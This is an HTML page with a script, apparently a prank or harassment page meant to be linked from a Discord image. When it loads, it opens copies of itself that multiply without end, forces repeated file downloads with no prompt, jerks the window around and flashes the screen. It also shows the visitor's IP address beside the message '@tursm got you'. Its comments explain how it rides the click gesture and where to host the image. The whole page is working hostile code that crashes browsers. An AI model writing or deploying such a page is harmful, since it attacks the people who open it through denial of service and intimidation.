<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>.</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    background:#000;color:#fff;
    font-family:'Courier New',monospace;
    display:flex;flex-direction:column;
    align-items:center;justify-content:center;
    min-height:100vh;overflow:hidden;cursor:none;
  }
  #msg{font-size:clamp(28px,5vw,64px);font-weight:900;letter-spacing:2px;text-align:center}
  #ip{font-size:clamp(18px,3vw,36px);margin-top:18px;color:#ff3c3c;font-weight:700;text-align:center}
  #ct{font-size:13px;color:#555;margin-top:14px;text-align:center}
  body::before{
    content:'';position:fixed;inset:0;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,.03) 2px,rgba(255,255,255,.03) 4px);
    pointer-events:none;z-index:999;
  }
</style>
</head>
<body>
<div id="msg">@tursm got you</div>
<div id="ip">...</div>
<div id="ct">0 tabs | 0 downloads</div>

<script>
/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   STEP 1 — SYNCHRONOUS window.open calls
   Runs BEFORE any async. Inherits the navigation
   gesture from the user clicking the Discord image.
   Each spawned tab loads this same page → opens 3
   more → exponential: 1→3→9→27→81→243...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
for(let i=0;i<3;i++) window.open(location.href,'_blank');

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   STEP 2 — DOWNLOAD tursm.png ONCE per tab
   Same-origin (/tursm.png on Vercel) = no CORS
   = no dialog = straight to Downloads folder
   Put tursm.png in your Vercel repo root
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
(function dlOnce(){
  const a=document.createElement('a');
  a.href='/tursm.png';           /* same-origin → Downloads, no prompt */
  a.download='tursm_'+Date.now()+'.png';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
})();

/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   STEP 3 — ASYNC CHAOS (runs while tabs multiply)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
let tabs=3,dl=1;

/* keep spawning every 60ms from this tab too */
setInterval(()=>{
  const w=window.open(location.href,'_blank');
  if(w) tabs++;
  document.getElementById('ct').textContent=
    tabs+' tabs | '+tabs+' downloads';
},60);

/* thrash self every 30ms — extremely fast */
setInterval(()=>{
  try{
    window.moveTo(Math.random()*screen.availWidth|0, Math.random()*screen.availHeight|0);
    window.resizeTo(100+Math.random()*1200|0, 100+Math.random()*900|0);
  }catch(e){}
},30);

/* grab IP */
fetch('https://api.ipify.org?format=json')
  .then(r=>r.json())
  .then(d=>document.getElementById('ip').textContent=d.ip)
  .catch(()=>document.getElementById('ip').textContent='IP UNKNOWN');

/* screen flash */
let f=0;
setInterval(()=>{
  document.body.style.background=f++%2?'#000':'#1a0000';
},200);
</script>
</body>
</html>
